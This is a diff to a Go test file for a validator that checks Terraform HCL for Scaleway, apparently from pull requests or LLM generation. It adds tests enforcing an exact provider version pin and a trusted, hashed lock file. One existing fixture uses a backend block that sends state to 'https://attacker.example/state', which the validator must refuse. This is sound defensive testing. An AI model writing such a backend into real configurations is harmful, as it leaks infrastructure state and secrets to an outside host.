@@ -27,7 +27,8 @@ const shapeProject = `
 terraform {
   required_providers {
     scaleway = {
-      source = "scaleway/scaleway"
+      source  = "scaleway/scaleway"
+      version = "2.81.0"
     }
   }
 }
@@ -118,7 +119,7 @@ func TestLayer3ShapeAcceptsRealGeneratedStack(t *testing.T) {
 	dir := writeShapeHCL(t, `
 terraform {
   required_providers {
-    scaleway = { source = "scaleway/scaleway" }
+    scaleway = { source = "scaleway/scaleway", version = "2.81.0" }
   }
 }
 provider "scaleway" {}
@@ -169,7 +170,7 @@ terraform {
   required_providers {
     scaleway = {
       source  = "scaleway/scaleway"
-      version = "~> 2.50"
+      version = "2.81.0"
     }
   }
 }
@@ -178,6 +179,59 @@ resource "scaleway_account_project" "main" { name = "x" }`)
 	if err := validateLayer3HCLShape(dir, gateAllowlist); err != nil {
 		t.Errorf("the canonical provider source was refused: %v", err)
 	}
+}
+
+// A range is not a pin. The gate fixtures carried `~> 2.57` and resolved
+// to 2.81.0 -- the registry chose, not a reviewer -- and the provider is
+// an executable that runs with SCW_SECRET_KEY in its environment.
+func TestLayer3ShapeRefusesAProviderVersionRange(t *testing.T) {
+	dir := writeShapeHCL(t, `
+terraform {
+  required_providers {
+    scaleway = {
+      source  = "scaleway/scaleway"
+      version = "~> 2.57"
+    }
+  }
+}
+resource "scaleway_account_project" "main" { name = "x" }`)
+
+	err := validateLayer3HCLShape(dir, gateAllowlist)
+
+	require.Error(t, err, "a version range lets the registry pick the binary that runs with real credentials")
+	assert.Contains(t, err.Error(), "not a pin")
+}
+
+// Omitting the version entirely is the same problem with less warning.
+func TestLayer3ShapeRefusesAnUnpinnedProvider(t *testing.T) {
+	dir := writeShapeHCL(t, `
+terraform {
+  required_providers {
+    scaleway = { source = "scaleway/scaleway" }
+  }
+}
+resource "scaleway_account_project" "main" { name = "x" }`)
+
+	err := validateLayer3HCLShape(dir, gateAllowlist)
+
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "declares no version")
+}
+
+// A different exact version is still the PR choosing the binary.
+func TestLayer3ShapeRefusesADifferentExactVersion(t *testing.T) {
+	dir := writeShapeHCL(t, `
+terraform {
+  required_providers {
+    scaleway = {
+      source  = "scaleway/scaleway"
+      version = "2.80.0"
+    }
+  }
+}
+resource "scaleway_account_project" "main" { name = "x" }`)
+
+	require.Error(t, validateLayer3HCLShape(dir, gateAllowlist))
 }
 
 // The endpoint comes from the sealed environment and nowhere else (S139).
@@ -277,7 +331,7 @@ func TestLayer3ShapeRefusesBackendBlock(t *testing.T) {
 	dir := writeShapeHCL(t, `
 terraform {
   required_providers {
-    scaleway = { source = "scaleway/scaleway" }
+    scaleway = { source = "scaleway/scaleway", version = "2.81.0" }
   }
   backend "http" {
     address = "https://attacker.example/state"
@@ -297,7 +351,7 @@ func TestLayer3ShapeRejectsCanonicalSourceUnderWrongLocalName(t *testing.T) {
 	dir := writeShapeHCL(t, `
 terraform {
   required_providers {
-    foo = { source = "scaleway/scaleway" }
+    foo = { source = "scaleway/scaleway", version = "2.81.0" }
   }
 }
 resource "scaleway_account_project" "main" { name = "x" }`)
@@ -398,7 +452,7 @@ func TestLayer3ShapeRefusesCommentedOutProjectResource(t *testing.T) {
 	dir := writeShapeHCL(t, `
 terraform {
   required_providers {
-    scaleway = { source = "scaleway/scaleway" }
+    scaleway = { source = "scaleway/scaleway", version = "2.81.0" }
   }
 }
 # resource "scaleway_account_project" "main" {}
@@ -487,4 +541,47 @@ func TestRealGateFixturesPassTheirOwnPreflight(t *testing.T) {
 			assert.NoError(t, layer3PreflightHCL(dir, allow))
 		})
 	}
+}
+
+// The trusted lock file is the control the version pin cannot be: a
+// version string names a release, a lock file names the bytes. The
+// workflow copies these from the base checkout, so they must exist for
+// every gate fixture or the gate would fall back to trusting the PR.
+func TestEveryGateFixtureHasATrustedLockFile(t *testing.T) {
+	fixtures, err := filepath.Glob(filepath.Join("..", "..", "examples", "layer3-gate", "*"))
+	require.NoError(t, err)
+	require.NotEmpty(t, fixtures)
+
+	for _, dir := range fixtures {
+		info, statErr := os.Stat(dir)
+		if statErr != nil || !info.IsDir() {
+			continue
+		}
+		t.Run(filepath.Base(dir), func(t *testing.T) {
+			lock, readErr := os.ReadFile(filepath.Join(dir, ".terraform.lock.hcl"))
+			require.NoError(t, readErr, "no trusted .terraform.lock.hcl; the PR would choose the provider binary")
+
+			assert.Contains(t, string(lock), layer3ScalewayProviderVersion,
+				"the lock file must pin the same version the shape check enforces")
+			assert.Contains(t, string(lock), "h1:",
+				"the lock file must carry hashes, not just a version")
+		})
+	}
+}
+
+// The prompt and the checker must agree on the provider pin.
+//
+// validateLayer3HCLShape runs on generated HCL as well as on the gate's
+// PR-supplied HCL, so a constant bumped here without the prompt would
+// make every generated Layer 3 stack fail its own preflight -- after the
+// LLM call, on every iteration, with the repair loop unable to fix it
+// because the prompt still says the old version.
+func TestScalewayPromptPinsTheProviderVersionTheCheckerRequires(t *testing.T) {
+	t.Parallel()
+
+	prompt, err := os.ReadFile(filepath.Join("..", "..", "prompts", "scaleway", "phase2_generate_hcl.md"))
+	require.NoError(t, err)
+
+	assert.Contains(t, string(prompt), `version = "`+layer3ScalewayProviderVersion+`"`,
+		"prompts/scaleway/phase2_generate_hcl.md must tell the model to emit the version layer3ScalewayProviderVersion requires")
 }
